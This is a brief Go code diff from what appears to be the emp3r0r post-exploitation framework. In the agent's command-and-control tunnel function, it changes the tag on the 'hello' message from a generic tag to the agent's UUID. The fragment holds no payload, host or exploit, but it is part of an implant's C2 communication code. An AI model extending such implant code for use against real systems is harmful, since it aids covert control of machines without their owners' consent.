@@ -158,7 +158,7 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 
 			// send hello
 			msg.Payload = "hello"
-			msg.Tag = emp3r0r_data.Tag
+			msg.Tag = emp3r0r_data.AgentUUID
 			err = out.Encode(msg)
 			if err != nil {
 				log.Printf("agent cannot connect to cc: %v", err)
